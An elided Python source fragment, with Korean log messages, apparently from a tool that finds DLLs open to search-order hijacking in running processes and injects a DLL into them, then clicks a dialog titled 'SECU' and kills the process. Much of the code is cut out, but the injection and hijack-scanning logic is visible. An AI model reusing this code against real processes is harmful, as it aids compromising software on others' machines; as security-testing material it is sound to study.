...
class hiJacking():
    ...
    def search_order_hijack(self):
        ...
        for i in tqdm(range(0,len(self.pid))):
            ...
            program_name, list_dlls = self.list_dll(i)
            ...
            for i in range(len(list_dlls)):
                try:
                    ...
                    print("\nERROR:: \"" + list_dlls[i] + "\" 를 복사 할 수 없습니다.")
                    pass
            ...
            print(f'\n{str(i)} 에서 Search Order Hijacking에 취약한 DLL 목록')
            for key,value in successed_path:
...
class injection():
    ...
    def attack(self):
        ...
        path_dll = current_path.replace("\\","/") +"/CreateDLL.dll"
        if len(self.pid) == 0:
            for i in self.exe_in:
                self.pid.append(self.create_process(i))
        for i in range(0,len(self.pid)):
            print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Injection!')
            inject(int(self.pid[i]),path_dll)
            app = Application(backend="win32").connect(process=int(self.pid[i]))
            try:
                dlg = app.window(title_re=".*SECU.*")
                dlg.Button.click()
                ...
                psutil.Process(int(self.pid[i])).kill()
                print(str(i) + " 인젝션 성공!")
